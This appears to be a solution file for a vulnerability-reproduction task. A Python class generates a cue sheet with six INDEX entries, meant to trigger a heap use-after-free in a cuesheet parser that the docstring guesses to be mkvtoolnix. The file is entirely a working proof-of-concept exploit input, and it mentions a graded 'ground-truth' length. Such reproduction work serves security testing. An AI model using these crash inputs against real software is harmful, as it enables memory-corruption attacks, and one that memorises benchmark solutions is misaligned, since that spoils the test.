import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to a Heap Use-After-Free in the cuesheet parser (likely mkvtoolnix).
        It occurs when adding multiple indices (seekpoints) to a track. The parser likely holds a reference
        to an element in the indices vector (e.g., to set the duration of the previous index) while 
        pushing a new index. If the vector reallocates during push_back, the held reference becomes invalid.
        
        Ground-truth length of 159 bytes suggests a structure of:
        1 FILE line + 1 TRACK line + ~6 INDEX lines.
        
        We generate 6 indices to ensure we exceed a typical small vector capacity (e.g., 4).
        """
        
        # Standard CUE header
        poc = b'FILE "a" WAVE\n'
        poc += b'  TRACK 01 AUDIO\n'
        
        # Append 6 indices.
        # Capacity often grows 0 -> 1 -> 2 -> 4 -> 8.
        # Adding the 5th and 6th element ensures we cross the 4-element boundary, triggering reallocation.
        for i in range(1, 7):
            # Format: INDEX <number> <MM:SS:FF>
            # We use sequential frames 01, 02...
            poc += f'    INDEX {i:02d} 00:00:{i:02d}\n'.encode('utf-8')
            
        return poc